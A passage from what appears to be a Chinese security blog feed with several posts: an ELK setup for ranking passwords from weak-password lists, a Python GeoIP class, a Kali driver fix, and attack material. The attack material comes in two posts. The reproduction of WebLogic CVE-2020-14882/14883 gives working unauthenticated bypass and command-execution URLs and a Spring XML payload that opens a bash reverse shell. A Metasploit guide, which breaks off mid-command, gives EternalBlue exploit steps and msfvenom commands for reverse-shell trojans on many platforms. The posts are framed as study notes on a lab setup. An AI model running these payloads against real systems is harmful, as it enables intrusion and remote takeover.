        <content type="html"><![CDATA[<h1 id="使用elk搭建密码top统计库"><a href="#使用elk搭建密码top统计库" class="headerlink" title="使用elk搭建密码top统计库"></a>使用elk搭建密码top统计库</h1><blockquote><p>elk本身是非常强大的日志处理系统，分别由elasticsearch、logstash、kibana构成，功能分别是数据库、数据处理、前端展示。利用这些搭建一套用于密码topN统计的系统。当然要完成这种统计需要强大的处理性能。</p></blockquote><h2 id="搭建基础环境"><a href="#搭建基础环境" class="headerlink" title="搭建基础环境"></a>搭建基础环境</h2><h3 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h3><ul><li>  操作系统： ubuntu 20.4 64位 </li><li>  内存：16G</li><li>  硬盘：2T数据盘，128G ssd系统盘</li><li>  ElasticSearch：7.10.1</li><li>  Kibana：7.10.1</li><li>  Logstash：7.10.1</li></ul><h3 id="1、elasticsearch"><a href="#1、elasticsearch" class="headerlink" title="1、elasticsearch"></a>1、elasticsearch</h3><p>解压文件，<code>tar -zxvf elasticsearch*.tar.gz</code>，切换目录到elasticsearch中，之后所有关于elasticsearch的设置基本发生在此目录中</p><p>修改配置文件，conf/elasticsearch.yml</p><p>建议修改如下 配置</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">----------路径----------根据实际情况做修改#数据存储路径#path.data: /path/to/data#日志文件路径#path.logs: /path/to/logs----------内存----------#在启动过程中是否为内存加锁:bootstrap.memory_lock: true请保证 `ES_HEAP_SIZE` 环境变量的设置大约为系统可用内存的一半----------网络-----------#绑定IP地址，单机搭建的情况建议改成127.0.0.1，network.host：127.0.0.1http.port:9200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动elasticsearch</p><p>通过命令<code>./bin/elasticsearch</code> 直接启动，以前台的形式运行。通过命令<code>curl 127.0.0.1:9200</code>查看是否启动成功。</p><p><img src="http://img.ex1t.xyz/20201211111927.png" alt="image-20201211111927281"></p><p>但是可以在使用过程中会报错，就是内存不足。此时需要修改jvm的大小。这个大小建议改成实际内存的一半。比我的电脑实际内存为16G，这里我用的就是8g。</p><p>文件位置：./config/jvm.options</p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">-Xms8g-Xmx8g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后使用命令<code>nohup ./bin/elasticsearch &amp;</code>以后台的方式运行ES</p><h3 id="2、Kibana"><a href="#2、Kibana" class="headerlink" title="2、Kibana"></a>2、Kibana</h3><p>下载kibana</p><p>解压文件，<code>tar -zxvf kibana*.tar.gz</code>，切换目录到kibana中，之后所有关于kibana的设置基本发生在此目录中。</p><p>kibana配置文件位置<code>./config/kibana.yml</code></p><pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">#监听端口server.port: 5601 #默认配置#IP配置server.host: 0.0.0.0 #建议改成全部网卡#elasticsearch 地址elasticsearch.hosts:["http://localhost:9200"] #根据实际情况配置，我上面配置的是localhost也就是127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后通过命令<code>nohup ./bin/kibana &amp;</code>在后台运行kabana，通过host:5601在浏览器访问kibana</p><p><img src="http://img.ex1t.xyz/20201211123637.png" alt="image-20201211123637929"></p><h3 id="3、logstash"><a href="#3、logstash" class="headerlink" title="3、logstash"></a>3、logstash</h3><blockquote><p>  添加数据实际上比较好用的方式是使用logstash进行数据导入，这种方式可以根据自己的实际情况，编写数据格式，定制化高，但是有一定的难度。实际上logstash也是整个部分中最重要的地方，就是数据导入，通过logstash可以将各种类型的数据格式后后导入到ES 中存储。</p></blockquote><h4 id="3-1-基础知识"><a href="#3-1-基础知识" class="headerlink" title="3.1 基础知识"></a>3.1 基础知识</h4><p>下载logstash</p><p>解压文件，<code>tar -zxvf logstash*.tar.gz</code>，切换目录到logstash中，之后所有关于logstash的设置基本发生在此目录中。</p><p>开始进行数据 导入前，我们先理解一个东西，logstash实际上是用来收集日志并进行格式化处理的一个工具，集input、filter和output等插件</p><ul><li><p>  input可以接受来自beat（elk中一个轻量级的客户端，有多种beat，有兴趣的朋友可以自行了解）、日志文件、syslog等方式收集的日志。具体的可以参考官方手册<a href="https://www.elastic.co/guide/en/logstash/current/input-plugins.html%E3%80%82%E6%88%91%E4%BB%AC%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AFfile%E6%8F%92%E4%BB%B6%E3%80%82">https://www.elastic.co/guide/en/logstash/current/input-plugins.html。我们这里使用的是file插件。</a></p></li><li><p>  filter可以使用grok、json、xml等方式格式化数据，根据实际情况选择某种方式具体的可以参考官方手册<a href="https://www.elastic.co/guide/en/logstash/current/filter-plugins.html%E3%80%82%E6%88%91%E4%BB%AC%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%BB%E8%A6%81%E6%98%AFgrok%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E6%83%85%E5%86%B5%E7%BC%96%E5%86%99%E4%B8%8D%E5%90%8C%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%9D%A5%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E3%80%82">https://www.elastic.co/guide/en/logstash/current/filter-plugins.html。我们这里使用的主要是grok，可以根据文件情况编写不同的正则表达式来处理文件。</a></p></li><li><p>  output实际上是结果的输出，也支持多种插件如syslog、csv、file等，具体参考官方手册<a href="https://www.elastic.co/guide/en/logstash/current/output-plugins.html">https://www.elastic.co/guide/en/logstash/current/output-plugins.html</a> ，我们这里使用的elasticsearch，将结果输出到es中。</p></li></ul><h4 id="3-2-简单的配置"><a href="#3-2-简单的配置" class="headerlink" title="3.2 简单的配置"></a>3.2 简单的配置</h4><p>示例文件weakpass.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">admin----123456admin----adminadmin----1admin----12345test----123test----testtest----1234……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config 目录下有个名为lostash-sample.conf的示例文件</p><pre class="line-numbers language-none"><code class="language-none"># Sample Logstash configuration for creating a simple# Beats -&gt; Logstash -&gt; Elasticsearch pipeline.#数据源也就是输入配置input {#这里使用的是beats插件  beats {    port =&gt; 5044  }}#数据输出使用的是elasticsearch插件output {  elasticsearch {    hosts =&gt; ["http://localhost:9200"]    index =&gt; "%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}"    #user =&gt; "elastic"    #password =&gt; "changeme"  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们根据上面的示例文件配置一个weakpass.conf文件</p><pre class="line-numbers language-none"><code class="language-none">input{file {    #要导入的示例文件path =&gt; "path/weakpass.txt"#开始位置start_position =&gt; "beginning"}}filter{grok{match =&gt; {#格式化数据"message"=&gt;"(?&lt;name&gt;.*?)----(?&lt;pwd&gt;.*)"}}}output{#使用debug将结果输出到屏幕中stdout {        codec =&gt; rubydebug    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用命令    <code>./bin/logstash -f config/weakpass.conf</code>来使用我们写的配置文件导入数据。</p><p><img src="http://img.ex1t.xyz/20201211135507.png" alt="image-20201211135507007"></p><p>如果运行命令之后没有数据输出，建议删除**<u>./data</u>**的所有文件，一定要看清楚目录。</p><p><img src="http://img.ex1t.xyz/20201211140317.png" alt="image-20201211140317413"></p><h4 id="3-3-垃圾数据剔除"><a href="#3-3-垃圾数据剔除" class="headerlink" title="3.3 垃圾数据剔除"></a>3.3 垃圾数据剔除</h4><p>为了减少数据的冗余度及硬盘空间的大小，所以我们要根据情况删除一些无用字段，如path、message、host等。我们在gork中加入配置</p><pre class="line-numbers language-none"><code class="language-none">remove_field=&gt;["path","message","host"]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://img.ex1t.xyz/20201211140704.png" alt="image-20201211140704603"></p><p><img src="http://img.ex1t.xyz/20201211140439.png" alt="image-20201211140439453"></p><p>通过这样的配置，我们的数据量就减少了，其实时间戳也是可以删除了，而且并没有存在的意义，每条记录都带一个时间戳，实在是占用硬盘 空间。</p><h4 id="3-4-数据导入ES"><a href="#3-4-数据导入ES" class="headerlink" title="3.4 数据导入ES"></a>3.4 数据导入ES</h4><p>因为我们是在测试，所有使用的文件一直是weakpass.txt，logstash存在一个问题，处理过一次的数据，不会重复处理（描述不一定正确）。所有建议清空data目录。再进行下面的操作。</p><p>修改配置文件如下</p><pre class="line-numbers language-none"><code class="language-none">input{        file {            #要导入的示例文件                path =&gt; "/media/k2/5fcda6c4-e009-41dd-a314-c54c3c55126b/elk/weakpass1.txt"                start_position =&gt; "beginning"        }}filter{        grok{                   match =&gt; {                        #格式化数据                        "message"=&gt;"(?&lt;name&gt;.*?)----(?&lt;pwd&gt;.*)"                }                remove_field=&gt;["path","message","host","@timestamp"]                #设置标签，当我们数据量比较多的时候可以区分数据                add_tag =&gt; "weakpass"        }}output{        #使用debug将结果输出到屏幕中        #stdout{ codec =&gt; rubydebug}        elasticsearch{                action =&gt; "index"                index =&gt; "weakpass"#索引名称                hosts =&gt; ["127.0.0.1:9200"] #ES地址        }               }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-5-使用kinaba"><a href="#3-5-使用kinaba" class="headerlink" title="3.5 使用kinaba"></a>3.5 使用kinaba</h4><p>之后我们就可以在kibana中的索引管理中看到我们的索引<img src="http://img.ex1t.xyz/20201211142722.png" alt="image-20201211142722173"></p><p>这是我们就可以根据所以创建索引模式了</p><p><img src="http://img.ex1t.xyz/20201211142850.png" alt="image-20201211142850371"></p><p>创建完成后就可以在discover中检索数据了</p><p><img src="http://img.ex1t.xyz/20201211143005.png" alt="image-20201211143005816"></p><p>比如我们输入1，就可以检索到所有跟1相关的数据，</p><p><img src="http://img.ex1t.xyz/20201211143209.png" alt="image-20201211143209272"></p><p>我们也可以检索用户名为admin的数据，这个就之会出来用户名为admin的用户了</p><p><img src="http://img.ex1t.xyz/20201211143121.png" alt="image-20201211143121559"></p><h2 id="统计密码排行"><a href="#统计密码排行" class="headerlink" title="统计密码排行"></a>统计密码排行</h2><p>使用kibana的dashboard可以统计密码排行</p><p>创建Data Table,选择源为我们上面创建的，之后进行如下的配置</p><p><img src="http://img.ex1t.xyz/20201211150607.png" alt="image-20201211150607496"></p><p>这样我们就得到了上面排名了。因为数据比较少，所以统计速度快，这里就做了演示，没有进行更多的数据导入了。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="优化存储"><a href="#优化存储" class="headerlink" title="优化存储"></a>优化存储</h3><p>由于logstash在导入数据中会加入一些无用的字段，这些字段会在每一条记录中都出现，所以可以删除来减少服务器的存储空间。</p><ul><li>path 原始路径</li><li>message 完整记录</li><li>host 主机名</li><li>@timestamp 时间戳</li></ul><pre class="line-numbers language-none"><code class="language-none">input{}filter{        grok{                match =&gt; {                        #格式化数据                        "message"=&gt;".*"                }                remove_field=&gt;["path","message","host","@timestamp"]                #设置标签                add_tag =&gt; "weakpass"        }}output{}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="优化索引"><a href="#优化索引" class="headerlink" title="优化索引"></a>优化索引</h3><p>由于我们要导入不同的口令文件，所以我们要为后面的检索做好准备，这里我们就要根据导入内容的不同在output部分写上不同类型的索引，方便后面做检索使用。</p><pre class="line-numbers language-none"><code class="language-none">output{        #使用debug将结果输出到屏幕中#       stdout{ codec =&gt; rubydebug}        elasticsearch{                action =&gt; "index"                index =&gt; "weakpass-mail-111" # 索引名                hosts =&gt; ["127.0.0.1:9200"]        }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index =&gt; 索引名，如果我们要导入的密码包括不同类型，这里抖机灵一下，写上不同的类型，<br>如weakpass-mail-1、weakpass-q-1、weakpass-b-1，这样我们在利用kibana进行创建索引样式时就可以创建weakpass*这一类的样式了。<br><img src="http://img.ex1t.xyz/mweb/16085563650225.jpgz0"><br>之后便可以在discover中选择对应的pattern来检索某一类数据。其实很有意思。</p>]]></content>
      
      
      
        <tags>
            
            <tag> elk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python获取ip地址归属地</title>
      <link href="/2020/12/26/%E4%BD%BF%E7%94%A8python%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80%E5%BD%92%E5%B1%9E%E5%9C%B0/"/>
      <url>/2020/12/26/%E4%BD%BF%E7%94%A8python%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80%E5%BD%92%E5%B1%9E%E5%9C%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ip地址归属"><a href="#ip地址归属" class="headerlink" title="ip地址归属"></a>ip地址归属</h1><p>使用geoip的ip地址库</p><pre class="line-numbers language-python__" data-language="python__"><code class="language-python__">import geoip2.databaseimport osclass Ip2Locate(object):    def __init__(self,ip):        self.ip = ip            @property        def locate(self):        databasesPath = os.path.join(os.path.abspath(os.path.dirpath(__file__)),'databases','GeoLite2-City.mmdb')# database path        reader = geoip2.database.Render(databasesPath)        try:            response = reader.city(self.ip)        except:            return        country_iso_code = response.country.iso_code # 国家缩写 eg: US        country = response.country.names['zh-CN'] # 国家（中文）eg: 美国        province = response.subdivisions.most_specific.names['zh-CN'] # 省份，州 （中文）eg: 明尼苏达州        province_iso_code = response.subdivisions.most_specific.iso_code #省份简写 eg: MN        city = response.city.names['zh-CN'] #城市名，（中文）eg: 明尼阿波利斯        latitude = response.location.latitude # 纬度        longitude = response.location.longitude # 经度        locate_info = {"country_iso_code":country_iso_code,                       "country":country,                       "province":province,                       "province_iso_code":province_iso_code,                       "city":city,                       "latitude":latitude,                       "longitude":longitude                        }        return locate_info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1488214883复现</title>
      <link href="/2020/12/03/cve-2020-1488214883%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/12/03/cve-2020-1488214883%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><p><img src="https://www.ex1t.xyz/wp-content/uploads/2020/12/20200804075633719.gif"></p><h2 id="1、漏洞来源"><a href="#1、漏洞来源" class="headerlink" title="1、漏洞来源"></a>1、漏洞来源</h2><p><strong>Weblogic</strong></p><p>Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p><p><img src="http://img.ex1t.xyz/20201230173950.png"></p><p><strong>CVE-2020-14883: 权限绕过漏洞</strong></p><p>远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code></p><p><strong>CVE-2020-14882: 代码执行漏洞</strong></p><p>结合 <code>CVE-2020-14883</code> 漏洞，远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p><h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><pre class="line-numbers language-none"><code class="language-none">weblogic 10.3.6.0.0weblogic 12.1.3.0.0weblogic 12.2.1.3.0weblogic 12.2.1.4.0weblogic 14.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、环境搭建"><a href="#3、环境搭建" class="headerlink" title="3、环境搭建"></a>3、环境搭建</h2><p>（1）Linux</p><p>vulhub已经更新了这个环境 </p><pre class="line-numbers language-none"><code class="language-none">cd vulhub/weblogic/CVE-2020-14882/ docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）win10</p><pre class="line-numbers language-none"><code class="language-none">链接：https://pan.baidu.com/s/1fCndQa1b1rahjrqGvLOybg 提取码：8888 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>由于时间原因，我只复现了linux环境部署</p><h2 id="4、漏洞利用"><a href="#4、漏洞利用" class="headerlink" title="4、漏洞利用"></a>4、漏洞利用</h2><h3 id="4-1、CVE-2020-14883：权限绕过"><a href="#4-1、CVE-2020-14883：权限绕过" class="headerlink" title="4.1、CVE-2020-14883：权限绕过"></a>4.1、<strong>CVE-2020-14883：权限绕过</strong></h3><p>通过以下路径越权进入控制台</p><pre class="line-numbers language-none"><code class="language-none">/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://img.ex1t.xyz/20201230174003.png"></p><h3 id="4-2、CVE-2020-14882-代码执行漏洞"><a href="#4-2、CVE-2020-14882-代码执行漏洞" class="headerlink" title="4.2、CVE-2020-14882: 代码执行漏洞"></a>4.2、CVE-2020-14882: 代码执行漏洞</h3><p><strong>1、命令执行</strong></p><p>/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27<strong>命令</strong>%27);%22);</p><p>创建文件</p><p>/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27<strong>touch /tmp/poc</strong>%27);%22);</p><p>前台显示404，后台已写入</p><p><img src="http://img.ex1t.xyz/20201230174016.png"></p><p><strong>2、加载执行远端xml文件</strong></p><p>通过FileSystemXmlApplicationContext()加载并执行远端xml文件：</p><p>/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(“<strong>地址</strong>“)</p><p><strong>Linux反弹shell</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;     &lt;constructor-arg&gt;         &lt;list&gt;           &lt;value&gt;/bin/bash&lt;/value&gt;           &lt;value&gt;-cc&lt;/value&gt;             &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1]]&gt;&lt;/value&gt;           &lt;/list&gt;         &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>win10打开计算器</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;     &lt;constructor-arg&gt;         &lt;list&gt;           &lt;value&gt;cmd&lt;/value&gt;           &lt;value&gt;/c&lt;/value&gt;             &lt;value&gt;&lt;![CDATA[calc]]&gt;&lt;/value&gt;           &lt;/list&gt;         &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>通过这个方法也可写入文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;     &lt;constructor-arg&gt;         &lt;list&gt;           &lt;value&gt;/bin/bash&lt;/value&gt;           &lt;value&gt;-cc&lt;/value&gt;             &lt;value&gt;&lt;![CDATA[echo '内容' &gt; 123.jsp]]&gt;&lt;/value&gt;           &lt;/list&gt;         &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试过写入一句话，连接失败。直接把木马复制进去也连接失败。</p><p>反弹shell不香吗，搞什么木马</p><h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>过一遍复现过程，记下笔记。那不是有手就行。</p><p>以上仅供学习交流，严禁用于违法途径</p><p><img src="http://img.ex1t.xyz/20201230174039.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KALI2020.4 安装pd tools 报错解决</title>
      <link href="/2020/12/02/kali2020-4-%E5%AE%89%E8%A3%85pd-tools-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
      <url>/2020/12/02/kali2020-4-%E5%AE%89%E8%A3%85pd-tools-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>不是翻译</p><ol><li> I managed to get Parallels Tools working today on my freshly updated Kali system by following the steps at <a href="https://kb.parallels.com/123968">https://kb.parallels.com/123968</a> but stopping before running ./install. Then follow the steps:</li><li>Move into the kmods directory, where you should see a file called prl_mod.tar.gz. Extract this archive so we can edit it.<br> 复制文件夹中所有文件到任意目录，进入kmos目录，解压prl_mod.tar.gz。</li><li>Open the file prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c and add the line “#define      segment_eq(a, b) ((a).seg == (b).seg)” to the top.<br> 打开文件<code>prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c</code>将内容<code>#define segment_eq(a, b) ((a).seg == (b).seg)"</code>放到文件开头</li><li>Open the file prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c and add the line “#include &lt;linux/blkdev.h&gt;” to the top.<br>打开文件<code>prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c</code>将内容<code>#include &lt;linux/blkdev.h&gt;</code>放在文件开头</li><li>Open the files prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile and prl_vid/Video/Guest/Linux/kmod/Makefile, and add the line “KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers” to the top.<br>编辑文件<code>prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile</code>和<code>prl_vid/Video/Guest/Linux/kmod/Makefile</code>，将内容<code>KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers</code>添加到文件头</li><li>Re-create the archive with the edited files.<br>使用kmods目录下命令创建压缩包<code>tar tar -zcvf prl_mod.tar.gz .</code></li><li>Now run ./install and it should work.<br>使用管理员运行./install应该可以运行</li></ol><p>PS: 亲测可用，如果按照失败，可以重启之后在安装一次</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几个渗透工具的简单使用</title>
      <link href="/2020/09/14/%E5%87%A0%E4%B8%AA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/09/14/%E5%87%A0%E4%B8%AA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><h2 id="1、Metasploit"><a href="#1、Metasploit" class="headerlink" title="1、Metasploit"></a>1、Metasploit</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><blockquote><p>一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程。</p></blockquote><h3 id="1-2-下载安装"><a href="#1-2-下载安装" class="headerlink" title="1.2  下载安装"></a>1.2  下载安装</h3><p>kali自带，非kali的linux安装命令</p><pre class="line-numbers language-none"><code class="language-none">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  ./msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可能有些久</p><h3 id="1-3-使用说明"><a href="#1-3-使用说明" class="headerlink" title="1.3 使用说明"></a>1.3 使用说明</h3><pre class="line-numbers language-none"><code class="language-none">进入框架：msfconsole使用search命令查找相关漏洞： search  ms17-010使用use进入模块:  use exploit/windows/smb/ms17_010_eternalblue   使用info查看模块信息： info 设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp查看模块需要配置的参数：show options设置参数：set  RHOST  192.168.125.138          set port   8888攻击：exploit或run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。<br>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码</p><h3 id="1-4-木马生成"><a href="#1-4-木马生成" class="headerlink" title="1.4  木马生成"></a>1.4  木马生成</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip  -f -o shell.exe安卓app:msfvenom -p android/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -o test2.apkLinux:msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -f  elf <span class="token operator">&gt;</span> shell.elfMac:msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -f macho <span class="token operator">&gt;</span>  shell.machoPHP：msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f raw -o test.phpASP:msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f asp <span class="token operator">&gt;</span> shell.aspASPX：msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f  aspx <span class="token operator">&gt;</span> shell.aspxJSP:msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 -f  raw <span class="token operator">&gt;</span> shell.jspBash：msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f   raw <span class="token operator">&gt;</span> shell.shPerlmsfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f raw <span class="token operator">&gt;</span> shell.plpythonmsfvenom -p python/meterpreter/reverser_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left 